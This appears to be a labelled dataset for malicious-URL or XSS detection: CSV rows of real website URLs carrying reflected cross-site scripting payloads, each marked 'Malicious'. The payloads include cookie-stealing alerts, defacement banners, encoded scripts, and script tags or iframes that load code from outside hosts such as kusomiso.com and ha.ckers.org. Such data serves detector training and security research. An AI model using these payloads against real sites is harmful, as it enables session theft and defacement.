http://www.azr.ne.jp/aozoracgi/cgi/src/aozorasrh.cgi?whence=0&amp;max=20&amp;result=normal&amp;sort=score&amp;query=<br>'%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%20kusomiso.com%22)%3c/script%3e,Malicious
http://www.ecbshop.co.uk/search/index.asp?searchfor=%22%3e%3cscript%3ealert%281%29%3c%2fscript%3e,Malicious
http://lab.vodafone.it/blog/lab/search?q=%22%3e%3cscript+src%3d%22http%3a%2f%2fgooglebig.com%2fl.js%<br>22%3e&amp;cat=,Malicious
http://vijayabank.com/vijaya/vijaya/internet-en/menus/branch-search/branch_search_display.jsp?stview<br>=1&amp;edview=10&amp;currentpg=1&amp;search=branch%20name&amp;search_element=%3ciframe%20src=%22http://xssed.com%22%<br>3e,Malicious
http://www.xixixi.jp/xixixi2/index.html?scd=1&amp;qs=&amp;idp=&amp;kno='%3e%22%3e%3cscript/src=http://kusomiso.c<br>om/xss.js%3e%3c/script%3e,Malicious
https://www.no-ip.com/1click.php?ptype=%5c&amp;email_login=%22%22%3e%3e%3c%3c%2fscript%3e%3cimg+%22%22%2<br>2%3e%3cscript%3ealert%28%2fxss%2f%29%3c%2fscript%3e%22%3e%3e%3c%3cbody+onload%3dprompt%28document.do<br>main%29%3e&amp;password_login=%22%22%3e%3e%3c%3c%2fscript%3e%3cimg+%22%22%22%3e%3cscript%3ealert%28%2fxs<br>s%2f%29%3c%2fscrip&amp;firstname=%22%22%3e%3e%3c%3c%2fscript%3e%3cimg+%22%22%22%3e%3cscript&amp;lastname=%22<br>%22%3e%3e%3c%3c%2fscript%3e%3cimg+%22%22%22%3e%3cscript&amp;organization=%22%22%3e%3e%3c%3c%2fscript%3e%<br>3cimg+%22%22%22%3e%3cscript&amp;email=%22%22%3e%3e%3c%3c%2fscript%3e%3cimg+%22%22%22%3e%3cscript%3ealert<br>%28%2fxss%2f%29%3c%2fscrip&amp;password=%22%22%3e%3e%3c%3c%2fscript%3e%3cimg+%22%22%22%3e%3cscript%3eale<br>rt%28%2fxss%2f%29%3c%2fscrip&amp;c_password=%22%22%3e%3e%3c%3c%2fscript%3e%3cimg+%22%22%22%3e%3cscript%3<br>ealert%28%2fxss%2f%29%3c%2fscrip&amp;addr1=%22%22%3e%3e%3c%3c%2fscript%3e%3cimg+%22%22%22%3e%3cscript&amp;ad<br>dr2=%22%22%3e%3e%3c%3c%2fscript%3e%3cimg+%22%22%22%3e%3cscript&amp;city=%22%22%3e%3e%3c%3c%2fscript%3e%3<br>cimg+%22%22%22%3e%3cscript%3ealert%28%2fxss%2f%29%3c%2fscript%3e%22%3e%3e%3c%3cbody+onload%3dprompt%<br>28document.domain%29%3e&amp;country=us&amp;state=ss&amp;province=&amp;postal_code=&amp;phone=&amp;heard_about=&amp;x=37&amp;y=6&amp;subm<br>it=1,Malicious
http://mundocumbiero.tk/a?t=%27%22%3e%3c%2f%74%69%74%6c%65%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74<br>%28%31%33%33%37%29%3c%2f%73%63%72%69%70%74%3e%3e%3c%6d%61%72%71%75%65%65%3e%3c%68%31%3e%58%53%53%20%<br>62%79%20%58%59%4c%49%54%4f%4c%3c%2f%68%31%3e%3c%2f%6d%61%72%71%75%65%65%3e&amp;c=1&amp;p=1&amp;r=1196407897650,Malicious
http://aquaticeco.resultspage.com/search?p=q&amp;ts=custom&amp;w=%3c/script%3e%3cscript%3ealert(document.coo<br>kie);%3c/script%3e%3cscript%3e//%20&amp;x=0&amp;y=0,Malicious
http://www.secondhandsolar.com/showcategory.php?type=6&amp;keyword=&quot;&gt;&lt;script&gt;alert(backdoor)&lt;/script&gt;&gt;&lt;m<br>arquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.cell.com/searchresults?searchby=fulltext&amp;searchtext=%3c%2fstyle%3e%3cscript%3ea%3deval%3b<br>b%3dalert%3ba(b(%2fxss%20by%20xados%2f.source))%3b%3c%2fscript%3e%27%22%3e%3cmarquee%3e%3ch1%3e%22%3<br>e%3cscript%3ealert(document.cookie)%3c%2fscript%3c%2fh1%3e%3c%2fmarquee%3e&amp;submit_search=search,Malicious
http://www.tudofacil.rs.gov.br/busca/busca_chave.php?busca=%27%3balert%28string.fromcharcode%2883%2c<br>69%2c67%2c85%2c82%2c73%2c84%2c89%2c32%2c83%2c85%2c88%29%29%2f%2f%5c%27%3balert%28string.fromcharcode<br>%2883%2c69%2c67%2c85%2c82%2c73%2c84%2c89%2c32%2c83%2c85%2c88%29%29%2f%2f%22%3balert%28string.fromcha<br>rcode%2883%2c69%2c67%2c85%2c82%2c73%2c84%2c89%2c32%2c83%2c85%2c88%29%29%2f%2f%5c%22%3balert%28string<br>.fromcharcode%2883%2c69%2c67%2c85%2c82%2c73%2c84%2c89%2c32%2c83%2c85%2c88%29%29%2f%2f--%3e%3c%2fscri<br>pt%3e%22%3e%27%3e%3cscript%3ealert%28string.fromcharcode%2883%2c69%2c67%2c85%2c82%2c73%2c84%2c89%2c3<br>2%2c83%2c85%2c88%29%29%3c%2fscript%3e&amp;x=16&amp;y=12,Malicious
http://www.adtechus.com/contact_form/?sessionid=fa1bdd21f535e65&amp;category=34&amp;anrede=mr.&amp;vorname=&amp;name<br>=&amp;company=%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.ydt.gr/main/search.jsp?searchstring=%3cscript%3ealert%28string.fromcharcode%2883%2c116%2c<br>64%2c82%2c45%2c103%2c97%2c90%2c51%2c114%29%29%3c%2fscript%3e%3cmarquee%3e%3ch1%3est%40r-gaz3r%3c%2fh<br>1%3e%3c%2fmarquee%3e&amp;submit.x=14&amp;submit.y=13&amp;submit=submit,Malicious
http://www.capegateway.gov.za/search/index.php?q=error%22%3e%3cscript%20language=javascript%3ealert%<br>28document.cookie%29;%3c/script%3e,Malicious
http://www.nakucsd.com/gallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://spd.imelztal.de/winden/index.php/wikifarmssite/wikisandbox?from=%22/&gt;&lt;body<br>onload=alert(43727373537453637270746732)&gt;,Malicious
http://3.tool.ms/snchange.cgi?id='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://akmerkez.net/directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://2.tool.ms/new.cgi?id='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://www.globalsecuritymag.fr/spip.php?action=cookie&amp;url=java:%22%3cscript%3ealert('hello%20the%20<br>rat')%3c/script%3e,Malicious
http://www.szukacz.pl/szukaj.aspx?enc=iso-8859-2&amp;q=%22%3e%3cscript%3ealert%28document.cookie%29%3b%3<br>c%2fscript%3e&amp;ct=polska,Malicious
http://www.e-kent.com/content/destek/destekkb_home.asp?cat_name=&quot;&gt;&lt;script&gt;alert('trex')&lt;/script&gt;&lt;h1&gt;<br>hacked%20by%20trex&lt;/h1&gt;,Malicious
http://www.tankpilot.com/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backd<br>oor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.akfinancialplanners.com//?page=companies&id=1446&name=%22%3e%3ciframe%20src=http://hotturks.org/%3e/?page=companies&id=1446&name=%22%3e%3cscript%3ealert('thelegend%20')%3c/script%3edemo%20:%20http://mnhairremoval.com//?page=companies&id=1446&name=%22%3e%3ciframe%20src=http://hotturks.org/%3e,Malicious
http://pao-satun.go.th/webboard/philboard_search.asp?searchterms=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/s<br>cript&gt;&lt;h1&gt;www.raptr.us.tc&lt;/h1&gt;,Malicious
http://www.arsiv1.com/search.php?q=%22%3e%3clink%20href=http://starext.by.ru/css.css%20type=text/css<br>%20rel=stylesheet%3e,Malicious
http://www.onedate.com/profilo/signup.php?t=100&amp;name=%27%22%3e%3cscript%3ealert(1337)%3c/script%3e,Malicious
http://www.worldofwarcraft.com/search/searchresults.html?q=%22%3e%3cscript%3ealert%28123%29%3c/scrip<br>t%3e#pagetop,Malicious
http://benq.gr/press/news.cfm?id=1882&amp;cat=2&amp;year=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+nar<br>coticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://depositfiles.com/ru/switch_lang.php?return_url=%22%3e%3cscript%3ealert <br>(document.cookie)%3c/script%3e,Malicious
http://www.thainavigation.com/a_search.php?area_id=7'%3e%22%3e%3ciframe%20src=http://kusomiso.com/xs<br>s.html%20%3c,Malicious
http://cz.boincstats.com/stats/project_graph.php?pr='%3e%22%3e%3ciframe%20src=http://kusomiso.com/xs<br>s.html%20%3c,Malicious
http://search.pchome.net/index.php?wd=%22%3e%3cmarquee%3edefaced+by+sponsfull%3c%2fmarquee%3e,Malicious
http://www.collectionscanada.ca/structures/parlement/002034-119.01-f.php?image_id=&quot;&gt;&lt;script&gt;alert(&quot;m<br>axwel&quot;)&lt;/script&gt;,Malicious
http://kanpo.net/kanpo/cgi-bin/a-news/a-news.cgi?date=2007.11.30&amp;cal=%22%3e%27%3e%3c%73%63%72%69%70%<br>74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%3<br>1%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31<br>%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://katalog.hoga.pl/kategoria.asp?link=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/script%3e,Malicious
http://www.romanoprodi.it/cgi-bin/adon.cgi?campo=titolo&amp;campo=testo_html&amp;testo_ricerca=%22%3e%3cimg+<br>src%3d%22http%3a%2f%2fimg96.imageshack.us%2fimg96%2f8009%2fxssks5.jpg%22%3e&amp;image.x=15&amp;image.y=18&amp;ac<br>t=src,Malicious
http://gallery.pmck.org/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by%20n<br>arcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
https://www.probank.gr/search/index.php?qu=%22%3cmarquee%3e%3cimg+src%3dk.png+onerror%3dalert(%2fxss<br>%2f)+%2f%3e%3ch1%3exssed%3c%2fh1%3e,Malicious
http://www.icc-cricket.com/icc-news/content/story/icc/search.html?search=%22%3e%3cscript%3ealert%28%<br>27gurus%40icc+greetz+to+gurus+%21%21+neo%27%29%3c%2fscript%3e%3cimg+src%3d%22http%3a%2f%2fimg149.ima<br>geshack.us%2fimg149%2f1232%2flogonj5.gif%22%3e%3c,Malicious
http://www.dominiquemary.fr/panier/achat/recherche.php?motclef=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scr<br>ipt&gt;,Malicious
http://www.glin.gov/search.action;jsessionid=b7c30ebbb53a571bef43016b551355de.prod-app-1?popupsearch<br>=false&amp;fieldname=&amp;searchdetails.querystring=%3cscript%3ealert(%22iblaze%22)%3c%2fscript%3e&amp;searchdet<br>ails.querytype=all&amp;search=search&amp;searchdetails.includeallfields=true&amp;searchdetails.searchall=true&amp;se<br>archdetails.summarylanguage=%27%27&amp;searchdetails.publicationlanguage=&amp;searchdetails.publicationjuris<br>diction=&amp;searchdetails.publicationjurisdictionexclude=false&amp;searchdetails.publicationdatefrom=&amp;searc<br>hdetails.publicationdatefromday=01&amp;month=01&amp;searchdetails.publicationdatefromyear=&amp;searchdetails.pub<br>licationdateto=&amp;searchdetails.publicationdatetoday=01&amp;month=01&amp;searchdetails.publicationdatetoyear=&amp;<br>searchdetails.issuancedatefrom=&amp;searchdetails.issuancedatefromday=01&amp;month=01&amp;searchdetails.issuance<br>datefromyear=&amp;searchdetails.issuancedateto=&amp;searchdetails.issuancedatetoday=01&amp;month=01&amp;searchdetail<br>s.issuancedatetoyear=&amp;newsubjectterm=&amp;searchdetails.andsubjectterms=true&amp;searchdetails.subjectterms=<br>&amp;searchdetails.sortorder=default&amp;searchdetails.hitsperpage=10&amp;showsummary=true,Malicious
http://www.backscatter.com/learn/article/article.php?id=66%22%3e%20%20%20%20%3cscript%20src=http://l<br>upbot.comule.com/asu_abangjs.php%3e%3c/script%3e,Malicious
http://ms136.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://www.fag.com/content.fag.de/en/_global/search/search-results.jsp?searchstring=%27%22%3e%3c%2ft<br>itle%3e%3cscript%3ealert(1337)%3c%2fscript%3e%3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2f<br>marquee%3e&amp;searchid=1&amp;searchoption=en&amp;y=17&amp;x=16&amp;,Malicious
http://www.defencejobs.gov.au/default.asp?initmedia=1&amp;media=flash&amp;bounceback=%3e%22%3e%3cscript%20%0<br>a%0d%3ealert('noph0bia')%3b%3c/script%3e,Malicious
http://www.localjobboard.com/index.php?state=northcarolina&amp;citystate=concord.northcarolina%27%22%3e%<br>3cimg%20src=k.png%20onerror=alert(/xss/.source)%20/%3e,Malicious
http://www.agenceprodi.com/page.php?src=infoslegales.html&amp;lang=fr/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;,Malicious
http://www.fenomenmarket.com/bonie-selulit-bandi/odeme.asp?defurunid=%22%3e%3cscript%3ealert(%22docu<br>ment.cookie%22)%3c/script%3e,Malicious
http://www.xpmediacentre.com.au/community/downloads.php?do=cat&amp;id=4%22%3e%3cscript%3ealert(%22critia<br>!!%20vbulletin%20xssed%20\ncookie%20editor%22)%3c/script%3e,Malicious
http://www.lab.toho-u.ac.jp/sci/bio/geoeco/a-news/a-news.cgi?date=2007.10.31&amp;cal=%22%3e%27%3e%3c%73%<br>63%72%69%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%3<br>6%2c%31%32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31<br>%31%35%2c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://www.yeahbutno.com/mats/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;<br>by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.analog-fotografie.de/cms/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marque<br>e&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.legoorin.com/search.php?kword=%2525%2b100%2bkurdi&amp;page=10&amp;search_sid=111-222-1933email@ad<br>dress.com&amp;search_path=&gt;'&gt;&lt;script%20%0a%0d&gt;alert(612117574)%3b&lt;/script&gt;,Malicious
http://www.kouaa.com/search.php?keyword=%3cscript%3ealert(123)%3c%2fscript%3e+&amp;opt=0&amp;cherche.x=0&amp;che<br>rche.y=0,Malicious
http://torrentexplosion.com/search.php?search=%22%3e%3cscript%3ealert%28%22owned%20by%20t0t4l%22%29%<br>3c%2fscript%3e&amp;submit=get+me+fucking+porn%21,Malicious
http://www.casterclub.com/forums/downloads.php?do=cat&amp;id=2http://www.xpmediacentre.com.au/community/<br>downloads.php?do=cat&amp;id=4%22%3e%3cscript%3ealert(%22critia!!%20vbulletin%20xssed%20\ncookie%20editor<br>%22)%3c/script%3e,Malicious
http://www.carrefour.com/cdc/home/?com.carrefour.cdc.print.cart.force.empty=&quot;&gt;&lt;script&gt;alert(document<br>.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.rodopi.nl/functions/search.asp?bookid=')%3e%3c/script%3e%3cscript%3ealert(document.cookie<br>)%3c/script%3e,Malicious
http://www.shikoku.co.jp/namazu.php?query=textfield}%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss/<br>.source));%3c/script%3e,Malicious
http://translation.infoseek.co.jp/?ac=web&amp;lng=en&amp;web_translate_url=%22%3e%3cscript%3ealert(document.<br>cookie)%3c/script%3e%3e%3cmarquee%3e%3ch1%3eby+kusomiso.com%3c/h1%3e%3c/marquee%3e,Malicious
http://www.elleraner-hunnen.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.frmcell.net/forum/redirector.php?url=%22%3e%3cmarquee%3e%3ch1%3exssed%3c/h1%3e%3c/marquee<br>%3e,Malicious
http://search1-2.free.fr/google.pl?type_search=1&amp;qs=%22%3e%3cscript+src%3dhttp%3a%2f%2fha.ckers.org%<br>2fs.js%3e%3c%2fscript%3e,Malicious
http://www.jazz.com/search?q=%3c/title%3e%22+%27%3e%3cmarquee%3ecueballr%3c%2fmarquee%3e&amp;s=&amp;m=,Malicious
http://www.billoreilly.com/search/searchresultsframe.jsp?searchstring=%22%3e%3cscript%3ealert%28%22i<br>-landet%22%29%3b%3c%2fscript%3e&amp;x=0&amp;y=0&amp;sortby=0&amp;sortdir=1&amp;searchcategory=0,Malicious
http://calendar.boston.com/search?st=event&amp;srss=10&amp;swhat=&amp;svt=text&amp;swhere=%22%3e%27%3e%3ciframe%20sr<br>c=javascript:alert(123)%3e&amp;srad=60&amp;swhen=&amp;sort=0&amp;trim=1&amp;cat=80&amp;p12=search_hp_find_events,Malicious
http://www.cdi.ensp.unl.pt/docbweb/thres.asp?base=isbd&amp;searchterm=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/<br>script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://reflexes.samizdat.net/recherche.php?recherche=%3cscript%3ealert%28%27oi%21%2c+xylitol+is+back<br>%27%29%3c%2fscript%3e,Malicious
http://www.torrentspy.com/uploadtorrent.asp?tn=asdf%22%3e%3cscript%3ealert('xss')%3c/script%3e%3c%22<br>&amp;lngmaincat=&amp;lngsubcat=&amp;ts=,Malicious
http://www.c63.cn/product.asp?pid=3&amp;namep=%3cscript%3ealert(/st@r-gaz3r/)%3c/script%3e%3cmarquee%3e%<br>3ch1%3est@r-gaz3r%3c/h1%3e%3c/marquee%3e,Malicious
http://compareindia.in.com/search/%3c/div%3e%3cscript%3ealert%28/xss%20by%2003storic/%29%3c/script%3e/1,Malicious
https://campus.fsu.edu/webapps/login/bb_bb60/logincas.jsp?service=%22%3e%3cscript%3ealert%28document<br>.cookie%29%3c/script%3e,Malicious
http://www.esteio.rs.gov.br/home/show_page.asp?id_conteudo=+128&amp;codid_cat=+17&amp;imgcat=tema_search.jpg<br>&amp;procurar=%22%3e%3cscript+src%3dhttp%3a%2f%2fvuln.xssed.net%2fthirdparty%2fscripts%2fckers.org.js%3e<br>%3c%2fscript%3e&amp;bfind.x=14&amp;bfind.y=17,Malicious
http://www.veoh.com/search/videos/q/%22%3e%3c%252ftitle%3e%3cscript%3ealert%281337%29%3b%3c%252fscri<br>pt%3e%3ciframe+src%3d%22http%3a%252f%252fxssed.com%22%3e,Malicious
http://ohrm.os.doc.gov/search/index.htm?ssusertext=osama+bin+laden%22%3e%3cscript%3ealert%28%22xss%2<br>2%29%3c%2fscript%3e%3cx+,Malicious
http://boom.ge/search.php?query=1%3cscript%3eprompt%28922755%29%3c/script%3e,Malicious
http://www.todayssmallbiz.com/listings/showcategory.php?type=6&amp;keyword=&quot;&gt;&lt;script&gt;alert(backdoor)&lt;/sc<br>ript&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.un.lk/media_centre/press_releases.php?id=&quot;+onmouseover=alert(123)&lt;h1&gt;xss%20by%20turkpower<br>%20-%20from%20turkey&lt;/h1&gt;,Malicious
http://cracks.us/parking.php4?task=search&amp;domain=cracks.us&amp;trackquery=1&amp;s=44d898eb8b2297eff5b8&amp;tb=0&amp;<br>a_id=1&amp;language=en&amp;pgt=pryhpwmz67akewi1vfd9-lqoahuwzv4khthggegyayaaoa0&amp;pxy_t=0&amp;start=1&amp;add_c=8b884e5<br>08ce08f5e5bfcafe00f792be0&amp;sub=1&amp;keyword=%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2fkusomiso.com%2fx.<br>js%3e%3c%2fscript%3e&amp;search=search,Malicious
http://icstirlingshire.icnetwork.co.uk/search.cfm?query=%22%3e%3cscript%3ealert(/xss%20-%20thedeface<br>d.org/)%3c/script%3e%3cp,Malicious
http://www.thebig.tv/search_result.php?search_id=%20%22/%3e%3c/a%3e%3c/%3e%3cimg%20src=1.gif%20onerr<br>or=alert(1337)%3e&amp;search_typ=search_videos,Malicious
http://stats04.emcdda.europa.eu/%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%27%22%3e%3<br>cmarquee%3e%3ch1%3exxxxxxxxx%3c/h1%3e%3c/marquee%3e,Malicious
http://www.imagebulk.com/phpinfo.php?a[]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.benq.us/press/news.cfm?id=1882&amp;cat=2&amp;year=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by<br>+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://ageconsearch.umn.edu/simple-search?sort=date&amp;query='&gt;&lt;script&gt;alert(1);&lt;/script&gt;&amp;from_advanced<br>=true&amp;query2=&amp;field1=keyword&amp;conjunction2=and&amp;query1='&gt;&lt;script&gt;alert(1);&lt;/script&gt;&amp;field2=keyword&amp;que<br>ry3=&amp;conjunction1=and&amp;field3=any&amp;sortdirection=descending,Malicious
http://globalstarproductions.com/pages/gallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scri<br>pt&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://tv.msn.co.kr/enter/mvholic/info/multi_vod_view.html?_movieid=&quot;&gt;&lt;script&gt;alert(document.cookie)<br>&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.videorama.ma/video.asp?p=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3e%3cmarqu<br>ee%3e%3ch1%3emeloulisi%3c/h1%3e%3c/marquee%3e,Malicious
http://kisiselbasari.com/forum/hata.asp?hata=%3cscript%3ealert(%22by%20st@rext%22)%3c/script%3e,Malicious
http://vsmn.com/search.php?args=qs%3d06oenya4zgjblucxiczo4z9qbbqike0nggaldf5yyjpl0-jacz0jbopwp-8kv5q<br>zrjxhuhzl3g5tfsptuzze7to6u4s-sbbpsp4vl9thtrktvok5er0zacfagbbmkzgduo1tmfn_qkssr6z37dhvcubkwqhxycazgob<br>wadbhxd5riryszosa01meddrerbtfnzve-nhw..%2cyt0z&amp;uid=ws846e589247039e0.85930061&amp;src=&amp;term='%3e%22%3e%3<br>cscript/src=http://kusomiso.com/x.js%3e%3c/script%3e,Malicious
http://www.subway.com.au/ifeelgood/register.asp?e=&quot;&gt;&lt;script%20%0a%0d&gt;alert(/xss%20by%20turkpower/)%3<br>b&lt;/script&gt;&lt;h1&gt;xss%20by%20turkpower&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.legiscba.gov.ar/do_searchbk.asp?search_fields=%3cscript%3ealert(/xss/);%3c/script%3e,Malicious
http://www.stellenanzeigen.de/stellenangebote/list_main.asp?plz=%3cscript%3ealert(%22xss%22)%3c/scri<br>pt%3e&amp;radius=60&amp;topjobs=false&amp;track=1&amp;volltitel=0,Malicious
http://leonthemovie.com/image.php?image=%22%3e%3cscript%3ealert(1337);%3c/script%3e%3cmarquee%3e%3ch<br>1%3exss%20by%20warvector%20=)%3c/h1%3e%3c/marquee%3e%3c!--%3c!--,Malicious
http://www.freegolfclassifieds.com/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;mar<br>quee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://big5.yesky.com/b5/search.yesky.com/search.do?stype=0&amp;wd=%22%3e%3cscript%3ealert(%22maxwel%22)<br>%3c/script%3e,Malicious
http://www.ec21.com/ec-market/%22%3e%3cmarquee%3e%3ch1%3edefaced_by_ironzorg%3c%252fh1%3e%3c%252fmar<br>quee%3e.html,Malicious
http://www.ifai.jp/jituyo/a-news.cgi?date=2007.11.30&amp;cal=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%<br>65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2<br>c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34<br>%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://www.sailing.org/db/org/orgdisplay.asp?title=&lt;script&gt;alert(&quot;scriptorium(turkey)&quot;)&lt;/script&gt;&lt;met<br>a http-equiv=&quot;refresh&quot; content=&quot;0;url=http://www.canixim.com&quot;&gt;,Malicious
http://wdt.weather.fox.com/currentweatherpage/shortterm.php?state=fl&city=jacksonville%22%3e%3c/iframe%3e%3cscript%3ealert%28document.cookie%29;%3c/script%3e,Malicious
http://perezhilton.com/tv/index.php?keyword=%22%3e%3cscript%3ealert(1)%3c/script%3e&amp;start=0&amp;end=19#c<br>hannel,Malicious
http://www.inndir.com/program.php?id=7400%22%3e%3ch1%3eby%20st@rext%3c/h1%3e%3cscript%3ealert(docume<br>nt.cookie)%3c/script%3e,Malicious
http://www.gxt.it/gxt-ke-ti-guardi-download.php?idd=%3e'%3e%3cscript%20%0a%0d%3ealert(%22xssed%20by%<br>20whacker%22)%3b%3c/script%3e,Malicious
http://staff.lib.msu.edu/harris23/grants/3medema.htm%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/<br>script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%3c/h1%3e%3c/marquee%3e,Malicious
"http://www.parliament.uk/a-z/index.cfm?strletter=q&amp;lifilters=about,information%27%22%3e%3c/title%3e%<br>3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e",Malicious
http://zebani.net/directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.spectatornews.com/media/storage/paper218/news/2008/12/11/showcase/ask-anything-3577492.sh<br>tml%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3ehhhhh%3c/h<br>1%3e%3c/marquee%3e,Malicious
http://www.chriswaltersracing.com/igallery34/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.hackernews.com/?tag=wells-fargo&amp;instance=%27%22--%3e%3c/style%3e%3c/script%3e%3cscript%3e<br>alert%28%27xss%27%29%3c/script%3e,Malicious
http://www.suparco.gov.pk/search/search-results.asp?order=rank&amp;query=%3cscript%3ealert%28%22xssed+by<br>+snypter%22%29%3c%2fscript%3e&amp;x=0&amp;y=0,Malicious
http://www.essexcc.gov.uk/vip8/ecc/eccwebsite/dis/new.jsp?channeloid=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/scri<br>pt&gt;,Malicious
http://www.egypt.com/egypt_dir/ver_en/search.php?search_term=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scrip<br>t&gt;,Malicious
http://www.speedguide.net/poll_results.php?id=&quot;%22%3e%3cscript%3ealert(/xssed/);%3c/script%3e,Malicious
http://www.e-catalogue.schneider-electric.fr/navdoc/searchtelecatalog.asp?search=%27%22%3e%3cscript%<br>3ealert(%27lolz%27)%3c%2fscript%3e&amp;image1.x=13&amp;image1.y=8&amp;image1=submit&amp;cat=ex&amp;type=telecatalog,Malicious
https://acesso.uol.com.br/login.html?skin=%22%3e'%3e%3cscript%20src=http://vuln.xssed.net/thirdparty<br>/scripts/python5.js%3e%3c/script%3e,Malicious
http://www.memo.de/index.jsp?event=search&amp;page=search.jsp&amp;keywords=%22%3e%3cscript%3ealert(1)%3c%2fs<br>cript%3e&amp;x=0&amp;y=0,Malicious
http://www.bloglines.com/search?q=&amp;i=m&amp;ql=en&amp;s=f&amp;pop=l&amp;news=m&amp;u=totalschaden%22%3e%3cscript%3ealert(<br>'totalschaden')%3c/script%3e,Malicious
